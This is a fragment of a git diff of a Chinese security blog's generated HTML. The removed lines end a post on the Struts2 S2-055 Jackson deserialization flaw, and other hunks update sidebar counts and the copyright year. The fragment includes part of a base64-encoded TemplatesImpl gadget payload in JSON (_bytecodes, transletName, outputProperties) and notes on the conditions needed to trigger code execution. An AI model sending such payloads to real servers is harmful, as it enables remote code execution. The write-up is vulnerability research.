ABEADAAAAAwAAQAAAA4ADQAOAAAADwAAAAQAAQAQAAEAEQASAAEACgAAAEkAAAAEAAAAAbEAAAACAAsAAAAGAAEAAAAVAAwAAAAqAAQAAAABAA0ADgAAAAAAAQATABQAAQAAAAEAFQAWAAIAAAABABcAGAADAAEAEQAZAAIACgAAAD8AAAADAAAAAbEAAAACAAsAAAAGAAEAAAAaAAwAAAAgAAMAAAABAA0ADgAAAAAAAQATABQAAQAAAAEAGgAbAAIADwAAAAQAAQAcAAkAHQAeAAIACgAAAEEAAgACAAAACbsABVm3AAZMsQAAAAIACwAAAAoAAgAAAB0ACAAeAAwAAAAWAAIAAAAJAB8AIAAAAAgAAQAhAA4AAQAPAAAABAABACIAAQAjAAAAAgAk&quot;],&quot;transletName&quot;:&quot;a.b&quot;,&quot;outputProperties&quot;:&#123;&#125;&#125;]&#125;</div></pre></td></tr></table></figure></p>
-<p>首先将ContentType设置为application/json，这样请求才会丢给Jackson处理。这里最核心的部分就是clientName字段了，必须和前面注解部分绑定，也就是这个字段必须有，很显然，这个漏洞不具有通用性，首先得有一个Object类型的字段，其次这个字段还必须用注解JsonTypeInfo修饰。这种情况应该少之又少。下面给个计算器的图吧。<br><img src="/images/S2-055-cal.png" alt="1"></p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-    <! -- 添加微信图标 -->
-    
-      
-    
-    
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -2269,7 +2263,7 @@ class java.lang.ProcessBuilder</code></p>
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">32</span>
+                <span class="site-state-item-count">33</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -2280,7 +2274,7 @@ class java.lang.ProcessBuilder</code></p>
             
             <div class="site-state-item site-state-categories">
               
-                <span class="site-state-item-count">15</span>
+                <span class="site-state-item-count">16</span>
                 <span class="site-state-item-name">分类</span>
               
             </div>
@@ -2291,7 +2285,7 @@ class java.lang.ProcessBuilder</code></p>
             
             <div class="site-state-item site-state-tags">
               <a href="/categories/index.html">
-                <span class="site-state-item-count">113</span>
+                <span class="site-state-item-count">120</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
@@ -2369,7 +2363,7 @@ class java.lang.ProcessBuilder</code></p>
         <div class="copyright" >
   
   &copy; 
-  <span itemprop="copyrightYear">2018</span>
+  <span itemprop="copyrightYear">2019</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
